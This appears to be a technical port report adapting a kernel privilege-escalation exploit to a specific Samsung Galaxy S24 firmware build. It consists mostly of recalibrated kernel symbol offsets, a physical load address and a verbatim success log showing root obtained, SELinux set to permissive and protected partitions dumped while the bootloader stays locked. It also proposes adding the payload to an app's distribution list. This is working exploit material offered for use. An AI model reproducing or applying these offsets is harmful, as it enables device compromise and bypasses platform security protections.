# Port report: S9210 / S9210ZCS6DZI1 (SM-S9210 国行, e1q)

Status: **exploit verified on hardware** (two independent boots, both `attempt=1/24`).
KernelSU late-load not attempted from this side (see §5).

## 1. Device / firmware (read off the device)

| Field | Value |
| --- | --- |
| Model / codename | `SM-S9210` / `e1q` |
| CSC | `CHC` (China, single-CSC firmware) |
| PDA / build | `S9210ZCS6DZI1` |
| Fingerprint | `samsung/e1qzcx/e1q:16/BP4A.251205.006/S9210ZCS6DZI1:user/release-keys` |
| Kernel version string | `6.1.145-android14-11-3254743-abS9210ZCS6DZI1` |
| Kernel build | `#1 SMP PREEMPT Tue Sep 22 02:32:02 UTC 2026` |
| Security patch | 2026-08-05 |
| BL / KNOX | bootloader still locked, `ro.boot.warranty_bit=0`, `verifiedbootstate=green` |

Source of the kernel image: official FUS firmware `SM-S9210_4_20260922184650_1gc7d817xe_fac.zip`
(AP → `boot.img.lz4` → `boot.img` → **raw Image 38,005,248 B**, kernel section at `0x1000`, boot header v4).
Symbols recovered with `vmlinux-to-elf` (103,517 symbols).

## 2. Offsets: e1q-DZI1 vs e3q-DZF2 (same kernel build number!)

The version string carries the same build number as the CHC S9280 line (`...-android14-11-3254743-...`),
**but the offsets are not the same.** Measured with `llvm-nm` on the recovered ELF
(offset = address − `0xffffffc008000000`):

| macro | e3q-S9280ZCS6DZF2 (upstream) | e1q-S9210ZCS6DZI1 (this port) | Δ |
| --- | --- | --- | --- |
| `ASHMEM_MISC_FOPS_OFF` | `0x023bb5b0` | **`0x023bb600`** | +0x50 |
| `ASHMEM_FOPS_OFF` | `0x013d1140` | `0x013d1140` | 0 |
| `ASHMEM_IOCTL_OFF` | `0x00d3a314` | **`0x00d3a67c`** | +0x368 |
| `ASHMEM_COMPAT_IOCTL_OFF` | `0x00d3ac4c` | **`0x00d3afb4`** | +0x368 |
| `ASHMEM_MMAP_OFF` | `0x00d3aca4` | **`0x00d3b00c`** | +0x368 |
| `ASHMEM_OPEN_OFF` | `0x00d3aed0` | **`0x00d3b238`** | +0x368 |
| `ASHMEM_RELEASE_OFF` | `0x00d3af58` | **`0x00d3b2c0`** | +0x368 |
| `ASHMEM_SHOW_FDINFO_OFF` | `0x00d3b078` | **`0x00d3b3e0`** | +0x368 |
| `CONFIGFS_READ_ITER_OFF` | `0x004712a4` | **`0x004712dc`** | +0x38 |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `0x004717d4` | **`0x0047180c`** | +0x38 |
| `KMALLOC_CACHES_OFF` | `0x0176cbb8` | **`0x0176ce18`** | +0x260 |
| `SLIDE_NFULNL_LOGGER_OFF` | `0x016a61b8` | **`0x016a6698`** | +0x4e0 |
| `INIT_TASK_OFF` | `0x0224f8c0` | `0x0224f8c0` | 0 |
| `ROOT_TASK_GROUP_OFF` | `0x0244cd80` | `0x0244cd80` | 0 |
| `SELINUX_ENFORCING_OFF` (`selinux_state`) | `0x02521588` | `0x02521588` | 0 |
| `SLIDE_LOGGERS_0_1_OFF` (`nfulnl_logger`) | `0x02242a20` | `0x02242a20` | 0 |
| `SLIDE_RANDOM_BOOT_ID_DATA_OFF` | `0x023762f0` | `0x023762f0` | 0 |
| `SLIDE_SYSCTL_BOOTID_OFF` | `0x026046e8` | `0x026046e8` | 0 |
| `ANON_PIPE_BUF_OPS_OFF` | `0x01219d90` | `0x01219d90` | 0 |
| `COPY_SPLICE_READ_OFF` | `0x003ef340` | `0x003ef340` | 0 |
| `NOOP_LLSEEK_OFF` | `0x003a14e4` | `0x003a14e4` | 0 |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `0x000d39cc` | `0x000d39cc` | 0 |
| `SYSTEM_UNBOUND_WQ_OFF` | `0x0223ae60` | `0x0223ae60` | 0 |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | `0x000db1a0` | `0x000db1a0` | 0 |

How the non-symbol values were resolved:

* `ASHMEM_MISC_FOPS_OFF` — the miscdevice struct is `ashmem_miscs` = `0x23bb5f0`, and the `fops`
  field sits at +0x10 → `0x23bb600`. Cross-checked by scanning the image for the 8-byte value of
  `ashmem_fops`; the slot found is preceded by a pointer to the `"ashmem"` string, i.e. the
  miscdevice `{int minor; const char *name; const struct file_operations *fops; struct list_head list;}` layout.
* `SLIDE_NFULNL_LOGGER_OFF` — the standalone NUL-terminated `"nfnetlink_log"` string that is referenced
  by the logger struct (`nfulnl_logger @ 0x2242a20`); found via 8-byte pointer scan.
* `SLIDE_RANDOM_BOOT_ID_DATA_OFF` — the `data` field of the `boot_id` ctl_table entry
  (`procname` pointer at `0x23762e8`, so the data pointer is at `0x23762f0`).
* `SLIDE_TRACEFS_WORKER_CALLER_OFF` — the return address of `bl schedule` inside `worker_thread`
  (`worker_thread @ 0xdb100`, `bl schedule @ 0xdb19c` → `0xdb1a0`).

## 3. One macro that must be recalibrated per device: `P0_KERNEL_PHYS_LOAD`

* `0x80080000` (release default) → every attempt dies at `[*] p0 physical write status=256 ok=0` (attempts 1–5).
* **`0xa8000000`** (stable branch) → full chain, `attempt=1/24`, success.
  This matches what the app-domain asset for the CHC S24 line reports at runtime
  (`p0 profile … kernel_phys_load=00000000a8000000`).

## 4. Failure signatures seen with the wrong profile (for triage)

* e3q-S9280ZCS6DZF2 payload on this e1q device: every triggered attempt ends
  `[-] cfi misc_fops mismatch ret=0 target=… read=0 want=…` / `app fops slide attempt=1/1 triggered=1 verified=0 step=4`
  (fake-fops write lands in the wrong slot). Untriggered attempts show the usual `triggered=0`.
* Community e1q payload for the older DZG1 build: deterministic
  `[!] pipe KernelSnitch sk_buff page leak failed` + `pipe page child did not report base`, 23/23 identical.

## 5. Verification evidence

Verbatim excerpt from `run-log-dzi1-raw.txt` (this is the second boot; the first boot succeeded the
same way with `slide-kaslr-ok source=forced`, `pid=17383`):

```
[+] build config pid=15484 label=e1q-S9210ZCS6DZI1-app-physical-p0-oracle slide=pselect main=pselect
[+] p0 profile pid=15484 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff80296a6698 bootid_data=ffffff802a3762f0 init_task=ffffff802a24f8c0 root_tg=ffffff802a44cd80 sysctl_bootid=ffffff802a6046e8
[+] slide-kaslr-ok source=tracefs pid=15484 base=ffffffc0081c0000 slide=00000000001c0000
[*] cfi write ret=35 errno=0
[*] root umh result wake=1 complete=1 retval=0 socket=1
[*] app fops slide attempt=1/1 triggered=1 verified=1 step=0 errno=0
[+] pipe physrw pid=15484 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] exploit completed attempt=1/24
```

* Two independent boots (22:15 and earlier 21:25), both `attempt=1/24`.
* Post-exploit checks as root: `uid=0(root) … context=u:r:kernel:s0`, SELinux permissive,
  `dd` of 15 partitions (efs/sec_efs/modemst1/2/fsg/persist/param/storsec/keymaster/boot/init_boot/
  vendor_boot/vbmeta/vbmeta_system/dtbo, 312 MB) read back and hashed OK;
  `warranty_bit=0`, `verifiedbootstate=green`, BL still locked afterwards.

Not verified from this side: KernelSU late-load. On this ROM the project's own loader is required —
an official `ksud` (v3.3.1 ±v3.3.0) is `SIGKILL`ed (`rc=137`) even when re-executed in a non-kernel
SELinux domain as root, and `app_process`-based tools fail with
`CANNOT LINK EXECUTABLE "/system/bin/app_process": library "libnativeloader.so" not found`
when spawned from the exploitation daemon's context. (Likely Samsung Defex/RKP — consistent with the
project's `CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT` note.)

## 6. Artifacts in this report

* `src/targets/e1q-S9210ZCS6DZI1/target.h`
* `src/targets/e1q-S9210ZCS6DZI1/p0_fingerprint.h` (generated from the extracted raw Image at probe `0x1f0000`,
  tool self-check: 32 rows / 256 qwords)
* `cve-2026-43499-S9210ZCS6DZI1` — 104,128 B, sha256 `acea2b2ecf2c29a1cd57d23a8145f128373bf14ec87dd33eed91e5a7bd157cbf`
* `run-log-dzi1-raw.txt` — the successful attempt, verbatim
* `SHA256SUMS.txt`

Suggested upstream change (app side): add the asset above plus one enum entry

```kotlin
S9210DZI1("cve-2026-43499-S9210ZCS6DZI1", "One UI 8.5", "S24 全系 · 国行", "DZI1", Region.CHINA, "ksud-selected", tested = true),
```

and extend the 国行 build range in `server/payloads.json` with `*DZI1`.
